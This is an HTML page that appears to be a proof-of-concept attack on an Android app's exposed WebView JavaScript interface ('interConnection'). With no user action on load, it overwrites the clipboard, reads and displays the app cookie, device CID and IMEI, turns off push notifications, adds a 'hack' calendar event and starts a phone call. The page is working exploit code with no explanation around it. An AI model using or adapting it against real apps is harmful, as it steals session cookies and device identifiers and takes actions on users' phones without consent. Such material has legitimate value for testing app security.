<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name='viewport'
        content='width=device-width, target-densitydpi=device-dpi, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no' />
</head>

<body>
    <div id="content">webview</div>
    <script>

        function closeWebviewRefresh() {
            window.interConnection.closeWebviewRefresh();
        }

        function copy() {
            window.interConnection.copy("You have been hack!!!");
        }

        function getCID() {
            var result = window.interConnection.getCID();
            document.getElementById("content").innerText = "getCID:\n" + result;
            // document.getElementById("content").innerHTML = result;
        }

        function getCookie() {
            var result = window.interConnection.getCookie();
            document.getElementById("content").innerText = "getCookie:\n" + result;
        }

        function getIMEI() {
            var result = window.interConnection.getIMEI();
            document.getElementById("content").innerText = "getIMEI:\n" + result;
        }

        function getShareData() {
            var result = window.interConnection.getShareData(1000, "", "", "", "", "");
            document.getElementById("content").innerText = "getShareData:\n" + result;
        }

        function goBack() {
            window.interConnection.goBack();
        }

        function insertCalendarEvent() {
            var date = new Date();
            var time = date.getTime;
            window.interConnection.insertCalendarEvent("hack", "hahahahahahaha", time, time);
        }

        function openRewardsPolicyDialog() {
            window.interConnection.openRewardsPolicyDialog();
        }

        function openStarExchange() {
            window.interConnection.openStarExchange();
        }

        function openWeixinMiniProgram() {
            window.interConnection.openWeixinMiniProgram("hack", "path", 1);
        }

        function paste() {
            var result = window.interConnection.paste();
            document.getElementById("content").innerText = "paste:\n" + result;
        }

        function refreshPage() {
            window.interConnection.refreshPage();
        }

        function showPicturesWithUrl() {
            window.interConnection.showPicturesWithUrl("https://cdn.wccftech.com/wp-content/uploads/2016/06/chrome-bug-pirate-movies.jpg");
        }

        function turnOffPush() {
            window.interConnection.turnOffPush();
        }

        function zCircleModeIsVideoFloating() {
            window.interConnection.zCircleModeIsVideoFloating();
        }

        function zCircleModePhoneCall() {
            window.interConnection.zCircleModePhoneCall("10000");
        }

        function zModeDeleteReplyCallBack() {
            window.interConnection.zModeDeleteReplyCallBack("", "");
        }

        function zModeLikeCallBack() {
            window.interConnection.zModeLikeCallBack("1000");
        }

        function zModeReplyCallBack() {
            window.interConnection.zModeReplyCallBack("1000");
        }

        //         setInterval(gotoWhiteUrl,5);//5毫秒
        copy();
        getCID();
        getCookie();
        getIMEI();
        showPicturesWithUrl();
        turnOffPush();
        insertCalendarEvent();
        zCircleModePhoneCall();
    </script>
</body>

</html>
